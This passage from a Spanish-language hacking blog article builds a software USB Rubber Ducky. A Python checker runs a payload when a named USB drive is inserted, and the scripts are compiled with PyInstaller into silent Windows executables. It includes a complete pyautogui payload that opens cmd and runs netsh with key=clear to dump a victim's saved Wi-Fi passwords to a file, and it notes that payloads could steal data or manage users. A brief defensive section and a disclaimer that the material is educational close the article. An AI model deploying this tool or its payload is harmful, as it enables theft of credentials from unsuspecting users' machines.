+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/197296388-c17f6f24-08f1-406c-9c37-2aedd10445aa.png', 'Ilustración del procedimiento')"><img src="https://user-images.githubusercontent.com/75953873/197296388-c17f6f24-08f1-406c-9c37-2aedd10445aa.png" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Recalcando lo anterior, es importante que dentro del <code>if USB_etiqueta</code> específiquén el nombre del USB que vayan a utilizar para el Rubber Ducky. Solo quedaría ejecutar el checker e introducir el USB para comprobar su detección.</p>
+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/197084706-ab1a46f6-7e3a-4d98-8620-c72506096643.png', 'Ilustración del procedimiento')"><img src="https://user-images.githubusercontent.com/75953873/197084706-ab1a46f6-7e3a-4d98-8620-c72506096643.png" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Si todo funciona correctamente, agregaremos una última línea al checker para que una vez sea detectado ejecute el Rubber Ducky.</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('os.system(f&quot;python {USB_nombre}rubber_ducky.py&quot;)')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> os.system(f&quot;python {USB_nombre}rubber_ducky.py&quot;)</pre></div>
+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/197295519-d07c8b0a-41dc-4378-a928-22fe3b3ab701.png', 'Ilustración del procedimiento')"><img src="https://user-images.githubusercontent.com/75953873/197295519-d07c8b0a-41dc-4378-a928-22fe3b3ab701.png" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Por último, movemos el checker y el Rubber Ducky al pendrive, de forma automática se pondrá a escucha de dispositivos conectados. Cuando uno de ellos coincide con el nombre especificado en <code>USB_etiqueta</code> realiza la acción programada del payload.</p>
+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/197299389-9bc3efd6-1a8b-4259-8083-d578b53caa1d.gif', 'video-2')"><img src="https://user-images.githubusercontent.com/75953873/197299389-9bc3efd6-1a8b-4259-8083-d578b53caa1d.gif" alt="video-2" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">video-2 <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Todo funciona perfectamente, el único inconveniente es que solo funciona si la víctima tiene Python instalado en su sistema. Para poder ejecutar el Rubber Ducky deberíamos convertir nuestros scripts <code>.py</code> a un archivo ejecutable <code>.exe</code> con el módulo <a href="https://pyinstaller.org/en/stable/" target="_blank" class="external-link">PyInstaller</a>.</p>
+<p>Instalar módulo:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('pip3 install pyinstaller')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> pip3 install pyinstaller</pre></div>
+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/197304823-47a40abf-517a-4b9a-acb1-165aee4cdc70.png', 'Ilustración del procedimiento')"><img src="https://user-images.githubusercontent.com/75953873/197304823-47a40abf-517a-4b9a-acb1-165aee4cdc70.png" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Con el siguiente comando convertimos nuestro archivo python en un ejecutable:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('pyinstaller --clean --onefile --windowed &lt;FILE&gt;.py')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> pyinstaller --clean --onefile --windowed &lt;FILE&gt;.py</pre></div>
+<p><strong>--clean</strong>: Borra todos los archivos de compilación.</p>
+<p><strong>--onefile</strong>: Para que se compile en un solo fichero.</p>
+<p><strong>--windowed</strong>: Evitar que se abra una terminal luego de ejecutar el fichero.</p>
+<h4 style="color: var(--accent-blue); margin: 1.4rem 0 .8rem;">EJEMPLO</h4>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('pyinstaller --clean --onefile --windowed rubber_ducky.py\npyinstaller --clean --onefile --windowed main.py')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> pyinstaller --clean --onefile --windowed rubber_ducky.py
+pyinstaller --clean --onefile --windowed main.py</pre></div>
+<p>Pero antes de convertir los scripts hay que editar el código del checker y sustituir la extensión <code>.py</code> al ejecutable <code>.exe</code>.</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('os.system(f&quot;{USB_nombre}RubberDucky.exe&quot;)')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> os.system(f&quot;{USB_nombre}RubberDucky.exe&quot;)</pre></div>
+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/197307836-9eae22b2-95a9-488c-9831-1fb000dea662.png', 'Ilustración del procedimiento')"><img src="https://user-images.githubusercontent.com/75953873/197307836-9eae22b2-95a9-488c-9831-1fb000dea662.png" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/197310767-5602e3fb-f9bf-43fa-aca7-c3bc3ffbdfef.png', 'Ilustración del procedimiento')"><img src="https://user-images.githubusercontent.com/75953873/197310767-5602e3fb-f9bf-43fa-aca7-c3bc3ffbdfef.png" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Se creará una carpeta llamada <code>dist</code> donde se almacenan los archivos ejecutables, debemos moverlos al pendrive y ejecutar solo el checker.</p>
+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/197309154-aecd6778-da08-497d-9597-65db83208011.gif', 'video-3')"><img src="https://user-images.githubusercontent.com/75953873/197309154-aecd6778-da08-497d-9597-65db83208011.gif" alt="video-3" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">video-3 <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Y de esta forma es posible ejecutar el Rubber Ducky en sistemas Windows. No fue necesario esconder el ejecutable ni pasarlo por ningún crypter, primero porque el payload configurado fue a modo de ejemplo (inofensivo) pero puede probablemente tratarse de un payload que robe datos, administre usuarios y demás, todo dependerá de la imaginación y necesidad del atacante.</p>
+<p>Este es otro ejemplo de payload para robar las credenciales Wi-Fi de la víctima:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('import pyautogui\n\npyautogui.keyDown(\&#x27;win\&#x27;)\npyautogui.keyDown(\&#x27;r\&#x27;)\npyautogui.keyUp(\&#x27;win\&#x27;)\npyautogui.keyUp(\&#x27;r\&#x27;)\npyautogui.write(\&#x27;cmd\&#x27;)\npyautogui.press(\&#x27;enter\&#x27;)\npyautogui.time.sleep(1)\npyautogui.write(\&#x27;netsh wlan show profile &gt; List-Wifi.txt\&#x27;)\npyautogui.press(\&#x27;enter\&#x27;)\npyautogui.time.sleep(1)\npyautogui.write(\&#x27;netsh wlan show profile name=* key=clear &gt; Pass-Wifi.txt\&#x27;)\npyautogui.press(\&#x27;enter\&#x27;)')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> import pyautogui
+
+pyautogui.keyDown(&#x27;win&#x27;)
+pyautogui.keyDown(&#x27;r&#x27;)
+pyautogui.keyUp(&#x27;win&#x27;)
+pyautogui.keyUp(&#x27;r&#x27;)
+pyautogui.write(&#x27;cmd&#x27;)
+pyautogui.press(&#x27;enter&#x27;)
+pyautogui.time.sleep(1)
+pyautogui.write(&#x27;netsh wlan show profile &gt; List-Wifi.txt&#x27;)
+pyautogui.press(&#x27;enter&#x27;)
+pyautogui.time.sleep(1)
+pyautogui.write(&#x27;netsh wlan show profile name=* key=clear &gt; Pass-Wifi.txt&#x27;)
+pyautogui.press(&#x27;enter&#x27;)</pre></div>
+<p>Lo primero que hace es enumerar todas las redes de nuestro alrededor (incluyendo SSID antiguos) y guardarlas en el fichero <code>List-Wifi.txt</code>, posteriormente ejecuta la siguiente frecuencia de comando para que brinde toda la información de las redes enumeradas, incluida la contraseña de la misma que se almacenarán en el fichero <code>Pass-Wifi.txt</code></p>
+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/198854198-20ffaea3-2df0-4a3c-8a8d-75846247357b.png', 'Ilustración del procedimiento')"><img src="https://user-images.githubusercontent.com/75953873/198854198-20ffaea3-2df0-4a3c-8a8d-75846247357b.png" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/198854270-7ca4ee99-b166-4bd9-a83d-a284ea7f2c76.png', 'Ilustración del procedimiento')"><img src="https://user-images.githubusercontent.com/75953873/198854270-7ca4ee99-b166-4bd9-a83d-a284ea7f2c76.png" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+                    </section>
+                    <section class="content-card" id="protegerse-contra-un-usb-rubber-ducky-2">
+                        <h2 class="section-title"><span class="hash">#</span> PROTEGERSE CONTRA UN USB RUBBER DUCKY</h2>
+                        <p>Los posibles efectos de este ataque son devastadores para cualquier empresa que no invierte en ciberseguridad. Los ataques de Rubber Ducky se aprovechan de la confianza del usuario (capa 8) para llevar a cabo el ataque, precisamente por eso se debe ser cuidadoso con conectar cualquier dispositivo desconocido en nuestro ordenador, o hacerlo en una máquina virtual de prueba. Por otra parte, existen herramientas como <a href="https://github.com/teamghsoftware/Beamgun" target="_blank" class="external-link">Beamgun</a> especializadas en monitorear dispositivos insertados. Cuando detecta uno, bloquea las pulsaciones de teclas de teclados falsos hasta su reinicio.</p>
+                    </section>
+                    <section class="content-card" id="responsabilidad-final">
+                        <div class="warning-box">
+                            <i class="fas fa-triangle-exclamation" style="color: var(--accent-red); margin-right: 1rem;"></i>
+                            <strong>Advertencia:</strong> Todo el contenido de este artículo es estrictamente educativo.
+                            No nos hacemos responsables del mal uso de esta herramienta o información. Practica únicamente
+                            en entornos controlados y con autorización.
+                        </div>
+                    </section>
+                </article>
+            </main>
+
+            <aside class="sidebar">
+                <div class="profile-card">
+                    <div class="avatar">
+                        <img src="https://avatars.githubusercontent.com/u/75953873?v=4" alt="R3LI4NT Avatar"
+                             style="width: 100%; height: 100%; border-radius: 30px; object-fit: cover;" loading="lazy">
+                    </div>
+                    <h3 class="profile-name">R3LI4NT</h3>
+                    <p class="profile-bio">Pentester · Malware Developer</p>
+                    <div style="display: flex; justify-content: center; gap: 2rem;">
+                        <div><div class="stat-number">51</div><div class="stat-label">Artículos</div></div>
+                        <div><div class="stat-number">3</div><div class="stat-label">Categorías</div></div>
+                    </div>
+                </div>
+
+                <div class="sidebar-section">
+                    <div class="section-title"><i class="fas fa-list"></i><span>EN ESTE ARTÍCULO</span></div>
+                    <div class="category-nav" id="sidebarToc"></div>
+                </div>
+
+                <div class="sidebar-section">
+                    <div class="section-title"><i class="fas fa-folder"></i><span>CATEGORÍAS</span></div>
+                    <div class="category-nav">
+                        <a href="../../index.html#ciberseguridad" class="nav-link"><i class="fas fa-lock" style="color: #00ff9d;"></i><span>Ciberseguridad</span></a>
+                        <a href="../../index.html#hacking" class="nav-link"><i class="fas fa-skull" style="color: #ff3b3b;"></i><span>Hacking</span></a>
+                        <a href="../../index.html#seguridad" class="nav-link"><i class="fas fa-shield-halved" style="color: #3b7bff;"></i><span>Seguridad</span></a>
+                    </div>
+                </div>
+
+                <div class="sidebar-section">
+                    <a href="https://github.com/R3LI4NT/articulos" target="_blank" style="text-decoration: none;">
+                        <div style="background: linear-gradient(135deg, #00ff9d, #7000ff); padding: 1.5rem; border-radius: 20px; text-align: center; color: white;">
+                            <i class="fab fa-github" style="font-size: 2rem; margin-bottom: 0.5rem;"></i>
+                            <div style="font-weight: 600;">github.com/R3LI4NT/articulos</div>
+                            <div style="font-size: 0.8rem; opacity: 0.9;">Ver repositorio →</div>
+                        </div>
+                    </a>
+                </div>
+            </aside>
+        </div>
+    </div>
+
+    <footer class="footer-modern">
+        <div class="container">
+            <div class="footer-grid">
+                <div>
+                    <div class="footer-logo">R3LI4NT_</div>
+                    <p class="footer-tagline">Conocimiento es poder, pero poder compartido es revolución.</p>
+                    <div class="social-links">
+                        <a href="https://github.com/R3LI4NT" class="social-link"><i class="fab fa-github"></i></a>
+                        <a href="#" class="social-link" id="toxLink"><i class="fa-brands fa-expeditedssl"></i></a>
+                        <a href="#" class="social-link" id="emailLink"><i class="fas fa-envelope"></i></a>
+                    </div>
+                </div>
+                <div class="footer-links">
+                    <h4>Explorar</h4>
+                    <ul>
+                        <li><a href="../../index.html#ciberseguridad">Ciberseguridad</a></li>
+                        <li><a href="../../index.html#hacking">Hacking</a></li>
+                        <li><a href="../../index.html#seguridad">Seguridad</a></li>
+                        <li><a href="../../index.html">Todos los artículos</a></li>
+                    </ul>
+                </div>
+                <div class="footer-links">
+                    <h4>Recursos</h4>
+                    <ul>
+                        <li><a href="https://github.com/R3LI4NT/articulos" target="_blank">GitHub</a></li>
+                        <li><a href="https://r3li4nt.github.io/" target="_blank">Currículum Vitae</a></li>
+                    </ul>
+                </div>
+                <div class="footer-links">
+                    <h4>Legal</h4>
+                    <ul><li><a href="#" id="responsabilidadLink">Responsabilidad</a></li></ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>© 2026 R3LI4NT · Todos los derechos reservados.</p>
+                <div class="matrix-code">{ 0x52, 0x33, 0x4c, 0x49, 0x34, 0x4e, 0x54 }</div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="toxModal" class="modal">
+        <div class="modal-content"><span class="modal-close">&times;</span>
+            <div class="modal-card"><div class="modal-icon"><i class="fa-brands fa-expeditedssl"></i></div>
+                <h2 class="modal-title">Tox ID</h2>
+                <div class="modal-info"><span class="modal-label">Tox ID:</span></div>
+                <div class="modal-complete"><code class="modal-code" style="font-size: 0.8rem; word-break: break-all;">08F21D19C314DB89700317A932C72EB26035AE002C34419E851730D751C579310AEB06CF4426</code></div>
+                <button class="modal-copy-btn" onclick="copyToClipboard('08F21D19C314DB89700317A932C72EB26035AE002C34419E851730D751C579310AEB06CF4426')"><i class="fas fa-copy"></i> Copiar Tox ID</button>
+                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-top: 1rem;"><i class="fas fa-info-circle"></i> Tox para comunicación segura</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="emailModal" class="modal">
+        <div class="modal-content"><span class="modal-close">&times;</span>
+            <div class="modal-card"><div class="modal-icon"><i class="fas fa-envelope"></i></div>
+                <h2 class="modal-title">Contacto</h2>
+                <div class="modal-info"><span class="modal-label">Email:</span><span class="modal-value">r3li4nt.contact</span></div>
+                <div class="modal-info"><span class="modal-label">Dominio:</span><span class="modal-value">keemail.me</span></div>
+                <div class="modal-complete"><code class="modal-code">r3li4nt.contact@keemail.me</code></div>
+                <button class="modal-copy-btn" onclick="copyToClipboard('r3li4nt.contact@keemail.me')"><i class="fas fa-copy"></i> Copiar</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="responsabilidadModal" class="modal">
+        <div class="modal-content"><span class="modal-close">&times;</span>
+            <div class="modal-card"><div class="modal-icon"><i class="fas fa-gavel"></i></div>
+                <h2 class="modal-title">Responsabilidad</h2>
+                <div class="modal-info" style="text-align: center; margin: 2rem 0;"><span class="modal-label" style="font-size: 1.2rem;">⚠️ AVISO IMPORTANTE ⚠️</span></div>
+                <div class="modal-complete" style="margin: 1.5rem 0;"><p style="color: var(--text-primary); font-size: 1.1rem; line-height: 1.6; text-align: center;">Todo lo que se enseñe en estos artículos es con fines educativos</p></div>
+                <button class="modal-copy-btn" onclick="closeAllModals()"><i class="fas fa-check"></i> Entendido</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="imageModal">
+        <span class="modal-close" onclick="closeImageModal()">&times;</span>
+        <img class="modal-content" id="modalImage" alt="Imagen ampliada">
+        <div class="modal-caption" id="modalCaption"></div>
+    </div>
+
+    <script src="../js/script.js"></script>
+    <script>
+        function openImageModal(src, caption) {
+            const modal = document.getElementById('imageModal');
+            document.getElementById('modalImage').src = src;
+            document.getElementById('modalCaption').innerHTML = caption;
+            modal.style.display = "flex";
+            document.body.style.overflow = 'hidden';
+        }
+        function closeImageModal() {
+            document.getElementById('imageModal').style.display = "none";
+            document.body.style.overflow = 'auto';
+        }
+        document.addEventListener('DOMContentLoaded', function() {
+            const headings = document.querySelectorAll('article .content-card h2');
+            const sidebarToc = document.getElementById('sidebarToc');
+            if (headings.length && sidebarToc) {
+                sidebarToc.innerHTML = '';
+                headings.forEach((heading, index) => {
+                    const id = heading.textContent.toLowerCase().replace(/[^\w\s]/g, '').replace(/\s+/g, '-').replace(/^-+|-+$/g, '');
+                    heading.id = id || `section-${index}`;
+                    const link = document.createElement('a');
+                    link.href = `#${heading.id}`;
+                    link.className = 'nav-link';
+                    link.innerHTML = `<i class="fas fa-chevron-right"></i><span>${heading.textContent.replace('#', '').trim()}</span>`;
+                    sidebarToc.appendChild(link);
+                });
+                document.querySelectorAll('#sidebarToc .nav-link').forEach(link => {
+                    link.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        const t = document.querySelector(this.getAttribute('href'));
+                        if (t) t.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                    });
+                });
+                window.addEventListener('scroll', function() {
+                    let current = '';
+                    const scrollPos = window.scrollY + 120;
+                    headings.forEach(heading => {
+                        const s = heading.closest('.content-card');
+                        if (s && scrollPos >= s.offsetTop && scrollPos < s.offsetTop + s.offsetHeight) current = heading.id;
+                    });
+                    document.querySelectorAll('#sidebarToc .nav-link').forEach(link => {
+                        link.classList.toggle('active', link.getAttribute('href') === `#${current}`);
+                    });
+                });
+            }
+            const bind = (id, modal) => { const el = document.getElementById(id); if (el) el.addEventListener('click', e => { e.preventDefault(); document.getElementById(modal).style.display = 'flex'; }); };
+            bind('toxLink', 'toxModal'); bind('emailLink', 'emailModal'); bind('responsabilidadLink', 'responsabilidadModal');
+            document.querySelectorAll('.modal-close').forEach(btn => btn.addEventListener('click', closeAllModals));
+            window.addEventListener('click', e => { if (e.target.classList.contains('modal')) closeAllModals(); });
+            document.addEventListener('keydown', e => { if (e.key === 'Escape') closeAllModals(); });
+        });
+        function copyCommand(cmd) { navigator.clipboard.writeText(cmd).then(() => alert('Comando copiado al portapapeles'), () => alert('Error al copiar')); }
+        function copyToClipboard(t) { navigator.clipboard.writeText(t).then(() => alert('Copiado al portapapeles'), () => alert('Error al copiar')); }
+        function closeAllModals() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); document.getElementById('imageModal').style.display = 'none'; document.body.style.overflow = 'auto'; }
+        window.openImageModal = openImageModal; window.closeImageModal = closeImageModal;
+    </script>
+</body>
+</html>
